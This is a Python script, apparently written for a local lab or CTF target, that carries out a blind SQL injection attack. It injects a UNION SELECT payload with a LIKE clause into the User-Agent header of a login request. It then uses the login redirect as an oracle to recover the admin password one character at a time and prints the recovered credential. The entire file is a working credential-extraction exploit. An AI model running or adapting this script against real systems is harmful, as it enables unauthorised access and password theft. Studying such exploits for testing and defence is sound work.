import requests
import string


def login(base_url, user_agent, username="alice", password="super_secret_password"):
    headers = {'user-agent': user_agent}
    r = requests.post(f"{base_url}/login", data={'username': username, 'password': password}, headers=headers, allow_redirects=False)
    r.raise_for_status()
    return r


def guess_character(base_url, user, character, known_prefix="", indicator_page="profile"):
    guess_user_agent = f"spam_eggs' UNION SELECT '{indicator_page}' FROM Users WHERE username='{user}' AND password LIKE '{known_prefix}{character}%'-- "

    r = login(base_url, guess_user_agent)
    is_correct = r.headers.get("location") == f"/{indicator_page}"
    return is_correct


def get_password(base_url="http://localhost:8000", user="admin"):
    password = ""
    # Passwords are generated using token_urlsafe. They are base64 encoded with _ and - being the extra 2 characters.
    potential_characters = string.ascii_letters + string.digits + "_-"

    while True:
        prev_password = password
        for c in potential_characters:
            if guess_character(base_url, user, c, password):
                password += c
                # we found the next character, no need to continue the for loop
                break
        if password == prev_password:
            # No change for next character, we should be done and have the full password
            break
        else:
            print(f"Recovered password for {user} so far is: {password}")
    
    return password


if __name__ == "__main__":
    password = get_password()
    print(f"Recovered admin password: {password}")
